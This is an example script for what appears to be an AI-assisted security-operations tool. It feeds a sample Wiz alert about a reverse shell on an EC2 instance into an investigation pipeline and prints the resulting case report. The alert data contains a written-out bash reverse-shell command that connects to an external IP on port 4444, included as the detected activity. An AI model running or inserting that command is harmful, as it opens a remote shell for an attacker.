"""
Example: Investigating a reverse shell alert on an EC2 instance.

This demonstrates the full ZainGuard AI investigation pipeline:
    Director → Investigator → Reviewer → CaseReport

To run this example:
    cp env.example .env  # then fill in ANTHROPIC_API_KEY (and optionally VIRUSTOTAL_API_KEY)
    python examples/reverse_shell_alert.py

The example uses only VirusTotal (Layer 3) as a connector.
In a real deployment, you'd also add Layer 1 (Snowflake, CloudTrail, Okta, Wiz)
and Layer 2 (Glean, GitHub) connectors.
"""
import os
import json
from datetime import datetime

from dotenv import load_dotenv
load_dotenv()  # load .env from the repo root

from zainguard_ai_soc.pipeline import investigate
from zainguard_ai_soc.models import Alert, Severity
from zainguard_ai_soc.connectors.virustotal import VirusTotalConnector


def main() -> None:
    # A realistic Wiz runtime alert for a suspicious reverse shell
    alert = Alert(
        id="wiz-runtime-2024-0042",
        title="Suspicious outbound network connection from EC2 instance (possible reverse shell)",
        source="wiz_runtime",
        severity=Severity.HIGH,
        description=(
            "Wiz runtime agent detected an unusual outbound TCP connection from a web server EC2 instance "
            "to an external IP on port 4444. The connection was initiated by /bin/bash spawned from a "
            "Python process, which is a common reverse shell pattern."
        ),
        timestamp=datetime(2024, 11, 14, 3, 47, 22),
        raw={
            "rule_name": "Reverse Shell - Bash",
            "rule_severity": "HIGH",
            "resource_id": "i-0abc1234def56789",
            "resource_name": "prod-web-server-3",
            "cloud_account_id": "123456789012",
            "region": "us-east-1",
            "event_type": "NETWORK_CONNECTION",
            "process": {
                "name": "bash",
                "pid": 14732,
                "command_line": "/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
                "parent_process": "python3",
                "parent_pid": 14728,
            },
            "network": {
                "destination_ip": "198.51.100.42",
                "destination_port": 4444,
                "protocol": "TCP",
                "direction": "OUTBOUND",
            },
            "image_tag": "v2.3.1",
            "cluster": None,
        },
    )

    # Configure connectors
    # In production: add Snowflake, Okta, CloudTrail, Wiz, Glean connectors here
    connectors = []

    vt_key = os.environ.get("VIRUSTOTAL_API_KEY")
    if vt_key:
        connectors.append(VirusTotalConnector(api_key=vt_key))
        print("VirusTotal connector enabled.")
    else:
        print("VIRUSTOTAL_API_KEY not set — running without TI enrichment.")

    print(f"\nRunning investigation for: {alert.title}")
    print("=" * 60)

    report = investigate(
        alert=alert,
        connectors=connectors,
        # schema_registry=SchemaRegistry.from_file("schema_examples/snowflake_security.yaml"),
    )

    print(f"\nVERDICT: {report.verdict.value.upper()}")
    print(f"SEVERITY: {report.severity.value.upper()}")
    print(f"CONFIDENCE: {report.confidence}")
    print(f"\nEXECUTIVE SUMMARY:\n{report.executive_summary}")
    print(f"\nFINDINGS:\n{report.findings_summary}")

    if report.evidence_gaps:
        print("\nEVIDENCE GAPS:")
        for gap in report.evidence_gaps:
            print(f"  - {gap}")

    print("\nRECOMMENDATIONS FOR ANALYST:")
    for rec in report.recommendations:
        print(f"  - {rec}")

    print(f"\n{'=' * 60}")
    print(f"REQUIRES HUMAN REVIEW: {report.requires_human_review}")
    print("This case report is ready for analyst review.")

    # Optionally dump full report as JSON
    if os.environ.get("DUMP_REPORT"):
        import dataclasses
        print("\n--- Full Report (JSON) ---")
        print(json.dumps(dataclasses.asdict(report), indent=2, default=str))


if __name__ == "__main__":
    main()
